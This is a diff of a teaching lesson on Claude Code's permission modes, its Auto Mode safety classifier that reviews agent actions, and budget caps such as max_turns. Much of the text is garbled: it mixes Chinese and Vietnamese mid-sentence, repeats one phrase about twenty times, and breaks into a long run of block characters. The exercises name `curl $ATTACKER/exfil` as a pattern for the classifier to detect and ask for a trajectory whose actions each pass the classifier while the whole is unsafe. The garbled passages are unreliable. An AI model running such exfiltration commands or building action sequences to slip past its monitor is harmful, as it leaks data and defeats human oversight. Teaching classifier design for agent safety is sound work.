@@ -1,6 +1,6 @@
-# 作为自主代理的Cloed Code:权限模式与自动模式
+# Mô hình quyền hạn của đại lý độc lập
 
-> Claude Code  tiết lộ bảy loại quyền hạn mô hình. "kế hoạch" 会在每个动作前询问, "默认" chỉ sẽ đối với có风险的动作询问, " chấp nhậnEdits" 会 tự động phê duyệt文件写入,但仍会确认 shell 执行, "bypassPermissions" 会批准一切──Auto Mode(2026年3月24日) sử dụng hai giai đoạn đồng hành trình phân loại an toàn 取代 từng động phê duyệt: mỗi động sẽ chạy một mã chỉ 快速检查; được đánh dấu hoạt động sẽ khởi động chuỗi suy nghĩ kiểm duyệt sâu hơn――动作预算通过`max_turns`和 `max_budget_usd`强制执行──Auto Mode 以研究预览 形式发布Anthropic 已明确表示,classifier 单独使用并不足──
+> 权限阶梯 từ kiểm tra từng động tác đến phê duyệt mọi thứ 是利用 管控自主代理 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能执行的模式. 无需询问的模式.`auto`权限模式 dùng mô hình phân loại độc lập 取代 từng động tác phê duyệt: nó kiểm tra trước mỗi động tác, và ngăn chặn bất kỳ nâng cấp nào vượt quá phạm vi yêu cầu.`max_turns`和 `max_budget_usd`强制执行――`auto`Có hay không có tùy thuộc vào kế hoạch, tổ chức có được bật, mô hình và nhà cung cấp Anthropic 已明确表示,classifier 单独使用并不足──
 
 **类型：**Học tập
 **语言：**Python(stdlib,两阶段 phân loại mô phỏng)
@@ -11,32 +11,31 @@
 
 Cơ quan lập mã tự trị trên máy tính của bạn là một loại an ninh độc lập. Nhận thức tấn công là cơ quan này có thể truy cập mọi thứ. Hệ thống tệp, mạng, tín dụng, bảng ghi nhớ, bất kỳ tab trình duyệt nào, bất kỳ thiết bị mở nào. Bruce Schneier và những người khác đã công khai cho thấy điều này: Cơ quan sử dụng máy tính không phải là một lần cập nhật chức năng của chatbot, mà là một công cụ mới, có một hình ảnh mới.
 
-Hệ thống quyền hạn của Claude Code là câu trả lời của Anthropic. Nó không phải là một hệ thống tự trị / không tự trị, mà là một hệ thống có khả năng tạo thành các mô hình khác nhau.
+Hệ thống quyền hạn của Claude Code là câu trả lời của Anthropic. Nó không phải là một mô hình tự động / không tự động, mà là khả năng tạo thành sáu mô hình: kế hoạch → mặc định → chấp nhậnEdits → ... → bỏ quaTrả phép. Mỗi mô hình đều được thực hiện khác nhau giữa tốc độ và kiểm tra từng động tác.
 
 Vấn đề kỹ thuật là: hệ thống này có thể nắm bắt được gì, sẽ bỏ lỡ gì, và một nhiệm vụ nhất định nên sử dụng mô hình nào?
 
 ## 概念
 
-### 七种权限模式
+### 六种权限模式
 
 | 模式 | 行为 | 使用场景 |
 |---|---|---|
 | `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
-| `default` | Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
+| `default` | 在 UI 中标为 “Manual”。Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
 | `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
-| `acceptExec` | shell commands 在经过整理的 allowlist 内自动批准；写入自动批准 | 紧密 inner loops，其中每个 shell command 都是 `npm test` 或类似命令 |
-| `autoMode` | 两阶段 safety classifier；被标记的动作提升为审查 | 受限 workspace 中的 long-horizon unattended runs |
-| `yolo` | 跳过大多数提示；仍然运行 tool allowlist / denylist | 临时 sandboxes、CI jobs、research scripts |
+| `auto` | 由一个独立的 classifier model 在每个动作运行前审阅它；阻止任何超出请求范围的升级 | 受限 workspace 中的 long-horizon unattended runs |
+| `dontAsk` | 从不提示；未被 permission rules 预先批准的动作一律拒绝 | 临时 sandboxes、CI jobs、research scripts |
 | `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |
 
-(上面的名称与公开 Claude Code docs 一致;"yolo" là cái tên không chính thức của một người trung lưu cho phép.
+(nên trên cùng với công khai Claude Code docs 一致;UI 把 `default`标为 Hướng dẫn。)
 
 ### Một trang hiểu chế độ tự động
 
 Auto Mode (tiếp tục phát hành vào ngày 24 tháng 3 năm 2026) là mô hình đầu tiên được cấp quyền để phê duyệt động tác.
 
-1. **Stage 1 — single-token classifier。**Trong mỗi động tác được đề xuất, hoạt động trên. chi phí thấp. Trở về "an toàn" hoặc "bộ cờ".
-2. **Stage 2 — secondary policy/safety review。**Chỉ hoạt động trên động tác được đánh dấu. Cung quanh động tác này, phiên hiện tại và tuyên bố nhiệm vụ thực hiện chính sách tập trung và đánh giá an toàn. Nếu độ tin cậy thấp, thì nâng cấp lên HITL của người dùng.
+1. **一个独立的 classifier model。**Trong mỗi động tác đề xuất được xem xét trước khi chạy, dựa trên tuyên bố nhiệm vụ và phiên hiện tại để phán xét, và ngăn chặn bất kỳ nâng cấp vượt quá phạm vi yêu cầu.
+2. **受限的可用性。**否提供 `auto`取决于计划,组织是否启用,模型和供应商.
 
 预算 kiểm soát và phân loại không có:
 
@@ -64,9 +63,8 @@ Anthropic 将 Auto Mode 作为研究预览发布.文档明确说明,classifier �
 
 - nhiệm vụ không quen thuộc: từ `plan`开始──阅读计划 比回滚一次糟运行更便宜──
 - 已知 Refactor:`acceptEdits`能省下大量确认点击──
-- Không giám sát background run: chỉ khi bạn đã đo trên bán kính của vụ nổ trong không gian làm việc`autoMode`(Không có giấy chứng nhận, không có sản xuất, không có sự ra đi của bạn chưa có chủ động chọn)
-- Các container Ephemeral: khi và chỉ khi container  và các chứng chỉ của nó là bỏ đi,`yolo`- `bypassPermissions`才可接受.
-
+- Không giám sát background run: chỉ khi bạn đã đo trên bán kính của vụ nổ trong không gian làm việc`auto`(Không có giấy chứng nhận, không có sản xuất, không có sự ra đi của bạn chưa có chủ động chọn)
+- Các container Ephemeral: khi và chỉ khi container  và các chứng chỉ của nó là bỏ đi,`dontAsk`- `bypassPermissions`才可接受.
 
 ```figure
 autonomy-oversight
@@ -74,7 +72,7 @@ autonomy-oversight
 
 ## Sử dụng nó
 
-`code/main.py`模拟两阶段分类器. 阶段 1 là quy tắc từ khóa giá rẻ của các động cơ được đề xuất; giai đoạn 2 là một trình xem xét nhiều quy tắc chậm hơn. 司机 输入一段简短的合成轨迹.
+`code/main.py`Đặt một phân loại đánh giá hành động 模拟成两阶段管道这是教学上的简化;真实`auto`模式背后 là một mô hình phân loại độc lập, thay vì có tài liệu mô tả hai giai đoạn hiệp ước.
 
 ## 交付 nó
 
@@ -86,23 +84,23 @@ autonomy-oversight
 
 2. 扩展 Stage 1 quy tắc tập hợp, để bắt một hình dạng xấu được biết đến cụ thể`curl $ATTACKER/exfil`(■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
 
-3. 阅读 Anthropic's "Làm thế nào vòng lặp đại lý hoạt động" 文档――列出 đại lý 在 `default`模式下默认触碰的每种外部状态――在无监督运行`autoMode`Trước, những gì cần một cửa riêng biệt?
+3. 阅读 Anthropic's "Làm thế nào vòng lặp đại lý hoạt động" 文档――列出 đại lý 在 `default`模式下默认触碰的每种外部状态――在无监督运行`auto`Trước, những gì cần một cửa riêng biệt?
 
 4. 设计一个 24 小时 không giám sát ngân sách:`max_turns``max_budget_usd`、per-tool caps、allowlists──说明每个数字的理由──
 
-5. Mô tả một quỹ đạo: trong đó mỗi đơn lẻ động tác đều được phê duyệt giai đoạn 1 và giai đoạn 2, nhưng các hành vi kết hợp lại không phù hợp.
+5. Mô tả một quỹ đạo: trong đó mỗi đơn lẻ động tác đều được phân loại được phê duyệt, nhưng các hành vi kết hợp lại không phù hợp.
 
 ## 关键术语
 
 | 术语 | 人们常说 | 实际含义 |
 |---|---|---|
-| 权限模式 | “agent 能做多少事” | 控制逐动作批准的七种命名 policy 之一 |
+| 权限模式 | “agent 能做多少事” | 控制逐动作批准的六种命名 policy 之一 |
 | plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
 | acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
-| autoMode | “自动批准” | 两阶段 safety classifier；被标记的动作会升级 |
+| auto | “Auto approvals” | 独立的 classifier model 审阅每个动作；阻止超出请求范围的升级 |
 | bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
-| Stage 1 classifier | “Fast token check” | 针对拟议动作的 single-token rule；并行运行 |
-| Stage 2 classifier | “Deep review” | 对被标记动作进行 chain-of-thought reasoning |
+| Stage 1（simulator） | “Fast keyword check” | `code/main.py` 中针对拟议动作的廉价 rule |
+| Stage 2（simulator） | “Deep review” | `code/main.py` 中针对被标记动作的更慢 multi-rule reviewer |
 | Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |
 
 ## 延伸阅读
